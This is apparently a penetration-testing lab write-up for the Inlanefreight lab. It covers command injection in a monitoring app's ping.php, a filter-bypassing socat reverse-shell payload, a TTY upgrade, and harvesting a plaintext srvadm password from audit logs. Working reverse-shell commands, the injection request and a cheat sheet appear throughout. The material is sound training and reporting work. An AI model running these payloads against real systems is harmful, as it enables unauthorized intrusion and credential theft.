This section covers the transition from **external perimeter compromise → command execution → reverse shell → stable TTY → Linux privilege escalation through the `adm` group → credential discovery → user escalation to `srvadm`**.

The scenario is based on the **Inlanefreight penetration-testing lab** and assumes the activity is authorized under the lab/SOW.

![Image](https://images.openai.com/static-rsc-4/ntVSYxnAlkAw31RuJMeU0YLXfm4Hnx8AKrwUCBf7hz_9tx_X_kYR7Fdb0gofIACq3b3a9mULPQh6xPD4Di1kslwbfSFUO27dRmfLshXbajNU7AQ1xoAFWJsaZVFC0M2OCh1Zlva839wfMZXQ5yeW9vCwL1Dnlcwmhd0kyIGz6DwhkMeuzQHKTJgMbf51dfUk?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/BfDXxBA_ScuefTX1LasYDpIIcnLgH_fZd1BiCnRF9y3b0nGY4I5v3BB02fg8EcXuO2svftbD5xOYLlxZJVpteIhhWX_XQOFGSX0STzqF16ziKROWpuusFRR9C_sKggJcTXkYqEhgsfY68p8Csl2XC_bZPS5O8DO0g-7--d8q5F8kEV-8KNFZEVnsKUofwR6Y?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/0w8g2rkxzB1hArTNEbRcyjr15-ZW49CmctWwvi9cgIb72jzPgypROp5cRnmyo1fmw0gM30hu4Fi3tBmYVinBxV2GWE_PZTfZrpNC_6hYm5aCf2uGu7owyeT0AAbnXoTWVihMFnkdYsNknrGFArUYnmAk3BPjwJ_h1favfXkLcesEQrXISXgqWvI4pOxjxyAy?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/I4d5yb5w1Pl0R-CmiYnS9sTFC99NjTGo8fDZ06yVAYL-l9XhYNtQKcDgN-Lje0tPZaLiy2sX1mG3yhDCmqmkUxn2z6IagzxqdGZx9bGylrWbPdvK9dtcOdxzpci4bwadTVQO9KKkiTn09ih7K8ud_kOU6XfLSBafAUlr5VFRKxUmbo9ZoFBUaw1U9d35liuy?purpose=fullsize)

---

## 1. Initial Situation

After thoroughly enumerating and attacking the external perimeter, we identified the `monitoring.inlanefreight.local` application.

Earlier testing resulted in **Remote Code Execution (RCE)** through a command-injection vulnerability.

The objective now changes from:

> **External application compromise**

to:

> **Obtaining stable internal access and determining how far the compromise can progress, potentially up to Domain Admin level access.**

### Attack progression

```text
External Perimeter
       │
       ▼
monitoring.inlanefreight.local
       │
       ▼
Command Injection
       │
       ▼
Remote Code Execution
       │
       ▼
Reverse Shell
       │
       ▼
webdev
       │
       ▼
Read Audit Logs
       │
       ▼
Credential Discovery
       │
       ▼
srvadm
       │
       ▼
Further Privilege Escalation
```

---

# 2. Getting a Reverse Shell

The vulnerable application provides command execution through the `ping.php` functionality.

A normal Socat reverse shell would look like:

```bash
socat TCP4:10.10.14.5:8443 EXEC:/bin/bash
```

### Meaning

|Component|Purpose|
|---|---|
|`socat`|Network relay/data-transfer utility|
|`TCP4:`|Use IPv4 TCP|
|`10.10.14.5`|Attacker IP|
|`8443`|Listener port|
|`EXEC:/bin/bash`|Execute Bash and connect its input/output to the TCP connection|

The problem is that the application has **filters/blacklists**, so simply sending the command may not work.

---

# 3. Bypassing Command Filtering

The payload can be modified to bypass filtering.

The example uses:

```text
's'o'c'a't'
```

instead of:

```text
socat
```

This causes the shell to reconstruct the command as:

```text
socat
```

The payload also uses:

```bash
${IFS}
```

instead of normal spaces.

### Why `${IFS}`?

`IFS` means **Internal Field Separator**.

In a shell, it can represent whitespace and therefore allows a command such as:

```bash
socat TCP4:10.10.14.15:8443 EXEC:bash
```

to be represented as:

```bash
socat${IFS}TCP4:10.10.14.15:8443${IFS}EXEC:bash
```

This can be useful when spaces or specific characters are filtered.

---

## 4. Reverse-Shell Request

The resulting HTTP request is:

```http
GET /ping.php?ip=127.0.0.1%0a's'o'c'a't'${IFS}TCP4:10.10.14.15:8443${IFS}EXEC:bash HTTP/1.1
Host: monitoring.inlanefreight.local
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Content-Type: application/json
Accept: */*
Referer: http://monitoring.inlanefreight.local/index.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=ntpou9fdf13i90mju7lcrp3f06
Connection: close
```

### Important part

```text
127.0.0.1%0a
```

`%0a` represents a URL-encoded newline character.

Conceptually:

```text
127.0.0.1
<newline>
socat ...
```

This allows the injected command to be separated from the original expected input.

---

# 5. Start the Listener

Before sending the request, start a Netcat listener on the attack machine.

```bash
nc -nvlp 8443
```

Expected result:

```text
listening on [any] 8443 ...
```

After executing the request through Burp Repeater:

```text
connect to [10.10.14.15] from (UNKNOWN) [10.129.203.111] 51496
```

We now have shell access.

Run:

```bash
id
```

Output:

```text
uid=1004(webdev) gid=1004(webdev) groups=1004(webdev),4(adm)
```

---

# 6. Understanding the Initial User

The compromised account is:

```text
webdev
```

The important part is:

```text
groups=1004(webdev),4(adm)
```

The user belongs to the:

```text
adm
```

group.

This is immediately interesting from a Linux privilege-escalation perspective.

---

# 7. Why the `adm` Group Matters

On many Linux systems, members of the `adm` group can read various system log files.

Important locations can include:

```text
/var/log/
```

and, depending on configuration:

```text
/var/log/audit/
```

This means an attacker who compromises an `adm`-group user should investigate logs for:

- usernames
    
- commands
    
- authentication attempts
    
- passwords accidentally entered into terminals
    
- `sudo` activity
    
- `su` activity
    
- administrative operations
    
- application credentials
    
- other sensitive information
    

### Key lesson

> **Group memberships are often just as important as the initial user privileges.**

Always run:

```bash
id
```

immediately after obtaining a shell.

---

# 8. Enumerating Audit Logs

The technique used here is:

```bash
aureport
```

`aureport` is a utility used to generate summary reports from Linux audit logs.

The TTY report can be obtained with:

```bash
aureport --tty | less
```

The output begins with:

```text
Error opening config file (Permission denied)
NOTE - using built-in logs: /var/log/audit/audit.log
WARNING: terminal is not fully functional
```

Despite the configuration warning, the tool is able to use:

```text
/var/log/audit/audit.log
```

---

# 9. The Critical Audit Log Discovery

The interesting portion of the output is:

```text
TTY Report
===============================================
# date time event auid term sess comm data
===============================================
1. 06/01/22 07:12:53 349 1004 ? 4 sh "bash",<nl>
2. 06/01/22 07:13:14 350 1004 ? 4 su "ILFreightnixadm!",<nl>
3. 06/01/22 07:13:16 355 1004 ? 4 sh "sudo su srvadm",<nl>
4. 06/01/22 07:13:28 356 1004 ? 4 sudo "ILFreightnixadm!"
5. 06/01/22 07:13:28 360 1004 ? 4 sudo <nl>
6. 06/01/22 07:13:28 361 1004 ? 4 sh "exit",<nl>
7. 06/01/22 07:13:36 364 1004 ? 4 bash "su srvadm",<ret>,"exit",<ret>
```

This is an extremely important discovery.

---

# 10. Extracting the Credential

The audit record contains:

```text
su "ILFreightnixadm!"
```

and:

```text
sudo "ILFreightnixadm!"
```

It also shows attempts involving:

```text
srvadm
```

This suggests a potential credential pair:

```text
Username: srvadm
Password: ILFreightnixadm!
```

### Credential discovery

```text
srvadm : ILFreightnixadm!
```

> **Important:** In a real penetration-test report, credentials discovered in logs should be treated as sensitive evidence and stored securely.

---

# 11. Understanding What Happened

The audit records effectively reveal this sequence:

```text
User
 │
 ├── bash
 │
 ├── su
 │     └── password entered
 │
 ├── sudo su srvadm
 │     └── password entered
 │
 └── su srvadm
```

The important observation is that **authentication secrets were captured in the audit trail**.

This demonstrates why sensitive information should never be entered where it can accidentally become part of command/audit logging.

---

# 12. Switching to `srvadm`

We can test the discovered credential with:

```bash
su srvadm
```

The system prompts:

```text
Password:
```

Enter:

```text
ILFreightnixadm!
```

Then verify the resulting account:

```bash
id
```

Expected output:

```text
uid=1003(srvadm) gid=1003(srvadm) groups=1003(srvadm)
```

We have successfully transitioned from:

```text
webdev
```

to:

```text
srvadm
```

---

# 13. Improving the Shell

The resulting shell may initially be limited.

The example uses:

```bash
/bin/bash -i
```

After executing it:

```text
srvadm@dmz01:/var/www/html/monitoring$
```

We now have a more useful Bash environment.

---

# 14. Why Upgrade the Shell?

A basic reverse shell can have several limitations.

For example:

- poor terminal handling
    
- no command history
    
- broken interactive programs
    
- problems with `su`
    
- problems with `sudo`
    
- difficulty using SSH
    
- broken text editors
    
- poor tab completion
    
- incorrect terminal dimensions
    
- problems with interactive prompts
    

A proper **interactive TTY** provides a much better working environment.

---

# 15. Socat TTY Upgrade

The lab demonstrates a Socat-based TTY upgrade.

First, on the attack machine:

```bash
socat file:`tty`,raw,echo=0 tcp-listen:4443
```

### Breaking this command down

```text
socat
```

Starts Socat.

```text
file:`tty`
```

Uses the attacker's current terminal device.

```text
raw
```

Places the terminal into raw mode.

```text
echo=0
```

Disables local terminal echo.

```text
tcp-listen:4443
```

Creates a TCP listener on port `4443`.

---

# 16. Execute Socat on the Target

From the existing reverse shell:

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.15:4443
```

### Important parameters

|Parameter|Purpose|
|---|---|
|`exec:'bash -li'`|Starts an interactive login Bash shell|
|`pty`|Creates a pseudo-terminal|
|`stderr`|Handles standard error|
|`setsid`|Creates a new session|
|`sigint`|Handles interrupt signals|
|`sane`|Attempts to restore sane terminal settings|
|`tcp:10.10.14.15:4443`|Connects to attacker listener|

---

# 17. Resulting Stable Shell

If successful:

```bash
id
```

returns:

```text
uid=1004(webdev) gid=1004(webdev) groups=1004(webdev),4(adm)
```

The shell prompt becomes:

```text
webdev@dmz01:/var/www/html/monitoring$
```

This is much more usable than the initial raw reverse shell.

---

# 18. Complete Attack Chain

The complete sequence from this section can be represented as:

![Image](https://images.openai.com/static-rsc-4/5EYexU2yJ2pmuKYLJ2f3tXTcg5Q4gOSUvIUAO3VIj6ZgvF44w8UeOSA-Q8TlzLK5H2Ok-OKyQvhph6UHej0KFSDCbRXQCCD80ip1WXzhtwK5OTHi3WHbiq5J1LYmVC4swq9bc7liLWt0ORcgtTTD4HEdSek5J_jsPlEQD9uEa_7SbozHJwRF3O93MxvrKR3s?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/vsnHObc2F0BYGcAedoFDWlDPDgtFc2oskBhotV0m5Ivb4d3qgXTgqjzCo7SBkgPm3n70Mbu8DUREzkaxuGt7H6ZcoTk7PdAW6D7tWhgMBB5qk8NuxMfAQN6ADGU9-G3qV15QdWBJr6j6AfeFf2sUf5Xt22J36Ojw2Hunsu3W7ZSe5Yv4-j8OMjQJBlaHZPw5?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/s4mBNH3QdCBE5fdZDC24s6srRbqfF4Az1sNwTNYTU59BL8sE-nJD_DgX3r7nUCB_Us4jrfh2pGnl5KdMwrqsl7PGlzRWfHu64RK5BJbL0ZVifO5EUdQ4-Yu5u9mALRIZHCsXdAZR5L834vIbmq_M9v9xKDEMscwHc-eEtSRUP1QnDz3UoIo-F1lTAANBQPKU?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/xiEFP9skjWNAN5uyOQw-g4c6_ANlX_TKjl-ub6eyHVRlG95x-s-N2o6rdKqBkbI79nCikObA2mX8yryPZLByMAzM4Y4zCV7-xNBF3_xK0tCi9nm0UR5Rb1-iaaQhXDS04J-nvffw8pNZ7Omjxx4XHJ6M10p4QuyqTKMmV44WNCUxRlBN9CzZAjLTKZtjU1Lv?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/I4d5yb5w1Pl0R-CmiYnS9sTFC99NjTGo8fDZ06yVAYL-l9XhYNtQKcDgN-Lje0tPZaLiy2sX1mG3yhDCmqmkUxn2z6IagzxqdGZx9bGylrWbPdvK9dtcOdxzpci4bwadTVQO9KKkiTn09ih7K8ud_kOU6XfLSBafAUlr5VFRKxUmbo9ZoFBUaw1U9d35liuy?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/9haT5CZHnUBrRn72EGVUwI4eYMWABkiiASW4w9mXhXame-gWq95nNPkRsc7lR2pfCWjC2wJwrAWo_3Ylww6TEdJSXTxqQrSaF46EzYZ7uHAYTLEsy3xayCJQE5nWx66zTmRvCrnuE30mMp114Na2i3BUcTp1hUJZY4GpN4MmhA2Fq6LjZ_HGaFZjbwl-kloq?purpose=fullsize)

```text
┌─────────────────────────────┐
│ External Perimeter          │
└──────────────┬──────────────┘
               │
               ▼
┌─────────────────────────────┐
│ monitoring.inlanefreight    │
│ .local                      │
└──────────────┬──────────────┘
               │
               ▼
┌─────────────────────────────┐
│ Command Injection           │
│ Filter/Blacklist Bypass     │
└──────────────┬──────────────┘
               │
               ▼
┌─────────────────────────────┐
│ Remote Code Execution       │
└──────────────┬──────────────┘
               │
               ▼
┌─────────────────────────────┐
│ Socat Reverse Shell         │
└──────────────┬──────────────┘
               │
               ▼
┌─────────────────────────────┐
│ webdev                      │
│ UID 1004                    │
│ Group: adm                  │
└──────────────┬──────────────┘
               │
               ▼
┌─────────────────────────────┐
│ Read Audit Logs             │
│ aureport --tty              │
└──────────────┬──────────────┘
               │
               ▼
┌─────────────────────────────┐
│ Credential Discovery        │
│ srvadm / ILFreightnixadm!   │
└──────────────┬──────────────┘
               │
               ▼
┌─────────────────────────────┐
│ su srvadm                   │
└──────────────┬──────────────┘
               │
               ▼
┌─────────────────────────────┐
│ srvadm Shell                │
└─────────────────────────────┘
```

---

# 19. Commands Cheat Sheet

### Check current identity

```bash
id
```

```bash
whoami
```

```bash
groups
```

---

### Start reverse-shell listener

```bash
nc -nvlp 8443
```

---

### Basic Socat reverse shell

```bash
socat TCP4:10.10.14.15:8443 EXEC:/bin/bash
```

---

### TTY listener

```bash
socat file:`tty`,raw,echo=0 tcp-listen:4443
```

---

### Upgrade target shell

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.15:4443
```

---

### Audit TTY activity

```bash
aureport --tty | less
```

---

### Switch user

```bash
su srvadm
```

---

### Start interactive Bash

```bash
/bin/bash -i
```

---

# 20. Important Concepts to Remember

### 1. Always run `id`

After obtaining a shell, immediately determine:

```bash
id
```

because group membership can expose additional privileges.

---

### 2. `adm` can be valuable

If a compromised account belongs to:

```text
adm
```

investigate:

```text
/var/log/
```

and audit logs.

---

### 3. Logs can contain secrets

Logs can unintentionally expose:

- usernames
    
- passwords
    
- commands
    
- tokens
    
- API keys
    
- authentication attempts
    

In this lab, the audit log exposed a password.

---

### 4. A reverse shell isn't necessarily a stable shell

Initial access and stable access are different objectives.

```text
Reverse Shell
      ↓
TTY Upgrade
      ↓
Interactive Shell
```

---

### 5. Socat is extremely useful

Socat can be used for:

- TCP connections
    
- listeners
    
- reverse shells
    
- shell forwarding
    
- TTY upgrades
    
- port relaying
    

---

### 6. Credential reuse matters

Once credentials are discovered, determine whether they are valid for another account or service **within the authorized assessment scope**.

Here:

```text
webdev
   ↓
audit logs
   ↓
srvadm credentials
   ↓
srvadm
```

---

# 21. Key Findings From This Section

|Finding|Impact|
|---|---|
|Command injection|Enabled arbitrary command execution|
|RCE|Allowed execution on `dmz01`|
|Reverse shell|Provided remote interactive access|
|`webdev` account|Initial OS-level foothold|
|`adm` membership|Enabled access to sensitive logs|
|Audit log exposure|Revealed authentication activity|
|Credential exposure|Disclosed `srvadm` password|
|Credential reuse|Allowed transition to `srvadm`|
|TTY upgrade|Provided a more stable interactive shell|

---

# 22. Pentest Report Perspective

For the final penetration-testing report, this chain should be documented as a series of linked findings rather than simply reporting the final `srvadm` access.

A concise evidence chain is:

```text
Internet-facing application
        ↓
Command Injection
        ↓
RCE
        ↓
Reverse Shell
        ↓
webdev
        ↓
adm group membership
        ↓
Audit log access
        ↓
Credential disclosure
        ↓
srvadm authentication
```

The **root cause** is not simply that `srvadm` had a weak password. The attack chain also involved:

1. Command injection in the web application.
    
2. Insufficient command-input filtering.
    
3. Excessive log visibility for the compromised account.
    
4. Sensitive authentication data being recorded in accessible audit logs.
    
5. Credential reuse/exposure allowing another account to be accessed.
    

---

## 23. What We Achieved

At the end of this section, the assessment has progressed from:

```text
External Application
```

to:

```text
RCE
```

to:

```text
webdev
```

and finally:

```text
srvadm
```

The next logical phase is **persistence and further privilege escalation**, with the ultimate assessment objective being to determine whether the compromised environment can be progressed toward **root and, where applicable, Domain Admin-level access** within the authorized scope.